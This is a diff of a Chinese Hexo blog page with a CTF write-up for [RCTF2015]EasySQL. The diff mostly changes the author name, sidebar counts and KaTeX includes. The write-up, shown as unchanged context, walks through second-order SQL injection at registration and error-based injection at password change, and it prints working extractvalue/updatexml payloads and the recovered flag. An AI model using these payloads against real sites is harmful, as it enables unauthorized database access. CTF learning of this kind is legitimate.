@@ -27,21 +27,21 @@
 
   
   
-    <meta name="description" content="用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方  总共就只有这三处可以进行注入 我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号 12345678910111213注册admin&quot;密码为1登录admin&quot;密码为1修改密码1-&gt;2重返登录界面登录admin密码为2登录成功  我们成功登录admin的账号，但未发现fl">
+    <meta name="description" content="用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方  总共就只有这三处可以进行注入 我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号 12345678910111213注册admin&quot;密码为1登录admin&quot;密码为1修改密码1-&gt;2重返登录界面登录admin密码为2登录成功 我们成功登录admin的账号，但未发现flag">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[RCTF2015]EasySQL">
 <meta property="og:url" content="http://example.com/2025/04/01/[RCTF2015]EasySQL/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方  总共就只有这三处可以进行注入 我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号 12345678910111213注册admin&quot;密码为1登录admin&quot;密码为1修改密码1-&gt;2重返登录界面登录admin密码为2登录成功  我们成功登录admin的账号，但未发现fl">
+<meta property="og:description" content="用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方  总共就只有这三处可以进行注入 我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号 12345678910111213注册admin&quot;密码为1登录admin&quot;密码为1修改密码1-&gt;2重返登录界面登录admin密码为2登录成功 我们成功登录admin的账号，但未发现flag">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/20250401151840242.png">
+<meta property="og:image" content="http://example.com/2025/04/01/images/20250401151840242.png">
 <meta property="article:published_time" content="2025-04-01T07:16:00.000Z">
 <meta property="article:modified_time" content="2025-04-08T15:39:02.842Z">
-<meta property="article:author" content="fuboy">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="二次注入">
 <meta property="article:tag" content="报错注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/20250401151840242.png">
+<meta name="twitter:image" content="http://example.com/2025/04/01/images/20250401151840242.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -53,6 +53,14 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
   
   
   
@@ -204,14 +212,14 @@
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -219,7 +227,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -301,31 +309,27 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p> 用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方</p>
-<p><img src="/../images/20250401151840242.png" alt="image-20250401151840242"></p>
+        <p>用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方</p>
+<p><img src="../images/20250401151840242.png" alt="image-20250401151840242" /></p>
 <p>总共就只有这三处可以进行注入</p>
 <p>我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">注册admin&quot;</span><br><span class="line">密码为1</span><br><span class="line"></span><br><span class="line">登录admin&quot;</span><br><span class="line">密码为1</span><br><span class="line"></span><br><span class="line">修改密码</span><br><span class="line">1-&gt;2</span><br><span class="line"></span><br><span class="line">重返登录界面</span><br><span class="line">登录admin</span><br><span class="line">密码为2</span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure>
-
 <p>我们成功登录admin的账号，但未发现flag，但起码证明了注册页面存在二次注入</p>
 <p>那我们猜测后端注册页面的sql语句为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&quot;xxx&quot; and password=&#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
-
 <p>修改密码sql语句为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update password=&#x27;xxxx&#x27; where username=&quot;xxxx&quot;</span><br></pre></td></tr></table></figure>
-
 <p>还有一个信息就是注册页面无报错回显，而修改密码页面有报错回显</p>
 <p>那我们就可以使用报错注入</p>
 <p>在这之前我们先用fuzz测试一下，过滤了and,空格等</p>
 <p>但报错注入关键字还是没有被过滤的，那方向就没找错</p>
 <p>因为注册页面报错注入是无回显的</p>
-<p>我们在注册页面注册用户名<strong>xxx”|| (报错注入语句)</strong></p>
+<p>我们在注册页面注册用户名<strong>xxx&quot;|| (报错注入语句)</strong></p>
 <p>然后也用这个用户名去登录</p>
-<p>再到修改密码页面，随便修改个密码，这样就会执行<strong>update password&#x3D;’xxxx’ where username&#x3D;”xxx”|| (报错注入语句)”</strong></p>
+<p>再到修改密码页面，随便修改个密码，这样就会执行<strong>update password=‘xxxx’ where username=“xxx”|| (报错注入语句)&quot;</strong></p>
 <p>这样报错注入就有回显了</p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">查表名</span><br><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))#</span><br><span class="line"></span><br><span class="line">查字段名</span><br><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;)))#</span><br><span class="line"> </span><br><span class="line"> 查到了字段名，但数据回显不完全，报错注入只能回显32个字符</span><br><span class="line"> 且flag所在文件内容有多行，我们需要用regexp将f开头的进行筛选</span><br><span class="line"> </span><br><span class="line"> 1、 reverse()函数：将回显内容倒置</span><br><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))))#</span><br><span class="line"></span><br><span class="line">-&gt;flag&#123;c7619cc4-3d3e-4d74-8183-b3</span><br><span class="line"></span><br><span class="line">2、regexp(’^f’)将f开头的进行筛选</span><br><span class="line">admin&quot;||(updatexml(1,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),1))#</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">0acb7cbf483b-3818-47d4-e3d3-4c</span><br><span class="line">结合</span><br><span class="line">flag&#123;c7619cc4-3d3e-4d74-8183-b384fbc7bca0&#125;</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
@@ -398,7 +402,7 @@
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -409,10 +413,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -450,14 +454,14 @@
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -465,7 +469,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -585,12 +589,12 @@
       
       <script data-pjax>
         window.REIMU_POST = {
-          author: "fuboy",
+          author: "FuB0Y",
           title: "[RCTF2015]EasySQL",
           url: "http://example.com/2025/04/01/[RCTF2015]EasySQL/",
           excerpt: "",
           description: "",
-          stripContent: " 用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方  总共就只有这三处可以进行注入 我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号 12345678910111213注册admin&amp;quot;密码为1登录admin&amp;quot;密码为1修改密码1-&amp;gt;2重返登录界面登录admin密码为2登录成功  我们成功登录admin的账号，但未发现flag，但起码证明了注册页面存在二次注入 那我们猜测后端注册页面的sql语句为 1select * f",
+          stripContent: "用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方  总共就只有这三处可以进行注入 我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号 12345678910111213注册admin&amp;quot;密码为1登录admin&amp;quot;密码为1修改密码1-&amp;gt;2重返登录界面登录admin密码为2登录成功 我们成功登录admin的账号，但未发现flag，但起码证明了注册页面存在二次注入 那我们猜测后端注册页面的sql语句为 1select * fro",
           date: "Tue Apr 01 2025 15:16:00 GMT+0800",
           updated: "Tue Apr 08 2025 23:39:02 GMT+0800",
           cover: "/../images/17373827994914.jpg",
@@ -680,6 +684,15 @@
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
